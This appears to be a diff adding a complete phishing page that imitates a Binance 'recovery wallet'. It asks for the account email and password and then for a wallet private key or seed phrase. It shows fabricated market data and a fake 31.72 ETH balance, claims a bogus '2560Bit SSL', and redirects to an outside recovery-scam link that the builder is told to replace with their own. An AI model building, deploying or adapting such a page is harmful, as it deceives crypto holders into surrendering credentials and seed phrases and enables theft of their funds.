@@ -1,1 +1,239 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BINANCE RECOVERY WALLET</title>
+    <style>
+        :root { --bg: #0b0e11; --sidebar: #12161c; --card: #1e2329; --border: #2b3139; --yellow: #f3ba2f; --text: #eaecef; --text-gray: #848e9c; --up: #0ecb81; --down: #f6465d; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; height: 100vh; overflow: hidden; }
+        #auth-overlay { position: fixed; inset: 0; background: var(--bg); z-index: 100000; display: flex; justify-content: center; align-items: center; }
+        .auth-card { background: var(--card); padding: 35px; border-radius: 20px; width: 420px; text-align: center; border: 1px solid var(--border); box-sizing: border-box; }
+        .white-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 200000; }
+        .white-box { background: #181a20; color: white; padding: 30px; border-radius: 24px; width: 480px; text-align: center; border: 1px solid var(--border); box-sizing: border-box; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid var(--border); background: #0b0e11; color: white; box-sizing: border-box; font-size: 14px; outline: none; }
+        input:focus { border-color: var(--yellow); }
+        .btn-yellow { width: 100%; padding: 14px; background: var(--yellow); color: black; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 10px; font-size: 14px; }
+        .loader-ring { display: inline-block; width: 40px; height: 40px; border: 4px solid rgba(243, 186, 47, 0.1); border-radius: 50%; border-top-color: var(--yellow); animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #sidebar { width: 280px; background: var(--sidebar); border-right: 1px solid var(--border); padding: 25px; display: none; flex-direction: column; box-sizing: border-box; }
+        .logo { font-size: 22px; font-weight: 800; color: var(--yellow); margin-bottom: 35px; }
+        .nav-item { padding: 12px 15px; border-radius: 8px; color: var(--text-gray); cursor: pointer; margin-bottom: 6px; font-size: 14px; }
+        .nav-item:hover, .nav-item.active { background: var(--card); color: white; }
+        .btn-logout { margin-top: auto; color: var(--text-gray); border-top: 1px solid var(--border); padding-top: 20px; }
+        #main-wrapper { flex: 1; display: none; flex-direction: column; overflow: hidden; }
+        header { background: var(--sidebar); border-bottom: 1px solid var(--border); padding: 18px 30px; display: flex; justify-content: space-between; align-items: center; }
+        main { flex: 1; padding: 30px; overflow-y: auto; }
+        .table-container { background: #12161c; border-radius: 12px; border: 1px solid var(--border); overflow-x: auto; margin-bottom: 30px; max-height: 550px; overflow-y: auto; }
+        table { width: 100%; border-collapse: collapse; text-align: left; min-width: 900px; }
+        th { padding: 14px 18px; background: #1e2329; color: var(--text-gray); font-size: 11px; text-transform: uppercase; position: sticky; top: 0; z-index: 10; }
+        td { padding: 14px 18px; border-bottom: 1px solid var(--border); font-size: 13px; }
+        .crypto-scroll-container { max-height: 220px; overflow-y: auto; background: #1e2329; border-radius: 8px; padding: 8px; }
+
+        /* LOADING SPINNER DESIGN */
+        .spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid white;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spinBtn 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spinBtn { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<!-- 1. AUTH OVERLAY (LOGIN) -->
+<div id="auth-overlay">
+    <div class="auth-card">
+        <h2 style="color: var(--yellow); margin: 0 0 5px 0;">BINANCE</h2>
+        <p style="color:var(--text-gray); margin-bottom: 25px; text-transform: uppercase; font-size: 12px; letter-spacing: 1px;">RECOVERY SYSTEM</p>
+        <div style="text-align: left;">
+            <input type="email" id="l-email" placeholder="Old Account Email Address">
+            <input type="password" id="l-password" placeholder="Account Password">
+            <button class="btn-yellow" type="button" onclick="loginToDashboard()">Login Account</button>
+        </div>
+    </div>
+</div>
+
+<!-- 2. MAIN WALLET DASHBOARD PANELS -->
+<nav id="sidebar">
+    <div class="logo">BINANCE WALLET</div>
+    <div class="nav-item active" onclick="switchTab('market')">Market Coin Prices (1-100)</div>
+    <div class="nav-item" onclick="switchTab('history')">Transaction Ledger History</div>
+    <div class="nav-item" onclick="openWalletModal()" style="color:var(--yellow); font-weight: bold; border: 1px dashed var(--yellow); margin-top: 15px;">CONNECT YOUR WALLET</div>
+    <div class="nav-item btn-logout" onclick="location.reload()">Log Out</div>
+</nav>
+
+<div id="main-wrapper">
+    <header>
+        <div style="font-weight:bold; font-size:13px; text-transform: uppercase;">Ledger Status: <span style="color:var(--up)">Live Connected</span></div>
+        <div style="color: var(--text-gray); font-size: 13px;">User: Old_Account_Active</div>
+    </header>
+    <main>
+        <div id="tab-market" class="tab-content">
+            <h3 style="margin: 0 0 15px 0; font-size: 18px;">Top 100 Cryptocurrency Prices Overview</h3>
+            <div class="table-container">
+                <table>
+                    <thead><tr><th>Rank Asset Name</th><th>Live Market Price</th><th>24h Price Change</th><th>24h Volume Transactions</th></tr></thead>
+                    <tbody id="full-market-rows"></tbody>
+                </table>
+            </div>
+        </div>
+        <div id="tab-history" class="tab-content" style="display:none;">
+            <h3 style="margin: 0 0 15px 0; font-size: 18px;">Old Account Transaction Ledger History</h3>
+            <div class="table-container">
+                <table>
+                    <thead><tr><th>TXID Hash Code</th><th>Type</th><th>Asset Value</th><th>Timestamp Execution</th><th>Status Fields</th></tr></thead>
+                    <tbody id="full-history-rows"></tbody>
+                </table>
+            </div>
+        </div>
+    </main>
+</div>
+
+<!-- 3. WALLET RECONNECTION POP-UP MODAL BOX -->
+<div class="white-modal" id="wallet-modal">
+    <div class="white-box">
+        <div id="wallet-step-inputs">
+            <h3 style="margin:0 0 8px 0; font-size:16px;">Privacy protected with 2560Bit SSL.</h3>
+            <p style="font-size:11px; color:var(--text-gray); margin-bottom:20px;">CONNECT YOUR OLD WALLET LEDGER</p>
+            <input type="text" id="wallet-name" placeholder="WALLET NAME">
+            <input type="password" id="wallet-key" placeholder="PRIVATE KEY / SEED PHRASE">
+            <button class="btn-yellow" style="background:black; color:white; margin-top:15px;" onclick="runWalletSequence()">RECOVER WALLET</button>
+            <button class="btn-yellow" style="background:#2b3139; color:var(--text); margin-top:10px;" onclick="closeWalletModal()">Back to Dashboard</button>
+        </div>
+        <div id="wallet-step-loading" style="display: none; padding: 25px 0;">
+            <div class="loader-ring"></div>
+            <p style="color: var(--text); margin-top: 15px; font-weight: bold; font-size:14px;">Wallet Syncing... Please wait.</p>
+        </div>
+        <div id="wallet-step-old-account" style="display: none; text-align: left;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                <span style="color: var(--yellow); font-weight: bold; font-size: 13px;">🟨 Binance Asset Ledger (Synced)</span>
+                <span style="color: var(--up); font-size: 11px; font-weight:600; background:rgba(14,203,129,0.15); padding:2px 6px; border-radius:4px;">Detected</span>
+            </div>
+            <div style="background:#2b3139; padding:12px; border-radius:8px; margin-bottom:12px;">
+                <div style="color: var(--text-gray); font-size: 11px;">Estimated Balance</div>
+                <div style="color: white; font-size: 22px; font-weight: bold; margin: 2px 0;">31.72 ETH</div>
+                <div style="color: #b7bdc6; font-size: 13px;">≈ <span id="live-est-balance-rate-v4">$79,117.13</span> USD</div>
+            </div>
+            <button class="btn-yellow" id="wallet-step-binance-live-wd" style="background:var(--yellow); color:black; width:100%; margin-top:5px;">WITHDRAW ASSETS TO LIVE MAINNET</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    function loginToDashboard() {
+        document.getElementById('auth-overlay').style.display = 'none';
+        document.getElementById('sidebar').style.display = 'flex';
+        document.getElementById('main-wrapper').style.display = 'flex';
+        generateMarketData();
+        generateHistoryData();
+    }
+
+    function switchTab(tabId) {
+        document.querySelectorAll('.tab-content').forEach(el => el.style.display = 'none');
+        document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+        document.getElementById('tab-' + tabId).style.display = 'block';
+        if(event) event.currentTarget.classList.add('active');
+    }
+
+    function openWalletModal() { document.getElementById('wallet-modal').style.display = 'flex'; }
+    function closeWalletModal() { document.getElementById('wallet-modal').style.display = 'none'; }
+
+    // DITO GENERATED ANG BUONG 1-100 CRYPTO LIST
+    function generateMarketData() {
+        const tbody = document.getElementById('full-market-rows');
+        tbody.innerHTML = '';
+        
+        // Listahan ng mga pangunahing kilalang cryptocurrencies
+        const baseCoins = [
+            'Bitcoin (BTC)', 'Ethereum (ETH)', 'Tether (USDT)', 'BNB (BNB)', 'Solana (SOL)', 
+            'Ripple (XRP)', 'USDC (USDC)', 'Cardano (ADA)', 'Dogecoin (DOGE)', 'Avalanche (AVAX)',
+            'Shiba Inu (SHIB)', 'Polkadot (DOT)', 'TRON (TRX)', 'Chainlink (LINK)', 'Polygon (MATIC)',
+            'Uniswap (UNI)', 'Litecoin (LTC)', 'Dai (DAI)', 'NEAR Protocol (NEAR)', 'Uniswap (UNI)'
+        ];
+
+        // Loop hanggang umabot ng eksaktong 100 coins
+        for (let i = 1; i <= 100; i++) {
+            let coinName = baseCoins[(i - 1) % baseCoins.length];
+            // Kung lampas na sa base list, nilalagyan ng number para maging unique altcoins
+            if (i > baseCoins.length) {
+                coinName = coinName.replace(')', ` v${Math.ceil(i/baseCoins.length)})`);
+            }
+            
+            let price = i === 1 ? (Math.random() * 2000 + 75000).toFixed(2) : 
+                        i === 2 ? (Math.random() * 100 + 2100).toFixed(2) : 
+                        (Math.random() * 150 + 0.1).toFixed(4);
+            
+            let change = (Math.random() * 14 - 7).toFixed(2);
+            let color = change >= 0 ? 'var(--up)' : 'var(--down)';
+            let volume = (Math.random() * 50000000 + 100000).toLocaleString(undefined, {maximumFractionDigits: 0});
+
+            tbody.innerHTML += `<tr>
+                <td><b>#${i}</b> ${coinName}</td>
+                <td>$${parseFloat(price).toLocaleString(undefined, {minimumFractionDigits: 2})}</td>
+                <td style="color:${color}">${change >= 0 ? '+' : ''}${change}%</td>
+                <td>$${volume}</td>
+            </tr>`;
+        }
+    }
+
+    function generateHistoryData() {
+        const tbody = document.getElementById('full-history-rows');
+        tbody.innerHTML = '';
+        for(let i=0; i<10; i++) {
+            tbody.innerHTML += `<tr><td>0x${Math.random().toString(16).substr(2,8)}...</td><td>Deposit</td><td>+${(Math.random()*5).toFixed(2)} ETH</td><td>2026-05-18</td><td style="color:var(--up)">Success</td></tr>`;
+        }
+    }
+
+    function runWalletSequence() {
+        const wname = document.getElementById('wallet-name').value.trim();
+        const wkey = document.getElementById('wallet-key').value.trim();
+        if (wname === "" || wkey === "") { alert("Inputs required."); return; }
+
+        document.getElementById('wallet-step-inputs').style.display = 'none';
+        document.getElementById('wallet-step-loading').style.display = 'block';
+
+        setTimeout(() => {
+            document.getElementById('wallet-step-loading').style.display = 'none';
+            document.getElementById('wallet-step-old-account').style.display = 'block';
+
+            setInterval(() => {
+                const rateBox = document.getElementById('live-est-balance-rate-v4');
+                if (rateBox) {
+                    const randomDelta = (Math.random() * 2.5 - 1.25);
+                    rateBox.innerText = "$" + (79117.13 + randomDelta).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
+                }
+            }, 1000);
+        }, 3000);
+    }
+
+    // AUTOMATIC COUNTDOWN AT REDIRECT PAPUNTA SA LINK MO
+    document.getElementById('wallet-step-binance-live-wd').addEventListener('click', () => {
+        let seconds = 5;
+        const btn = document.getElementById('wallet-step-binance-live-wd');
+        
+        btn.disabled = true;
+        btn.style.background = '#0ecb81';
+        btn.style.color = 'white';
+        btn.innerHTML = `<span class="spinner"></span> Connecting... Redirecting in ${seconds}s`;
+
+        const countdown = setInterval(() => {
+            seconds--;
+            btn.innerHTML = `<span class="spinner"></span> Connecting... Redirecting in ${seconds}s`;
+            
+            if (seconds <= 0) {
+                clearInterval(countdown);
+                window.location.href = "https://binancerecovery231v.base44.app" // PALITAN MO ITO NG IYONG LINK
+            }
+        }, 1000);
+    });
+</script>
+</body>
+</html>
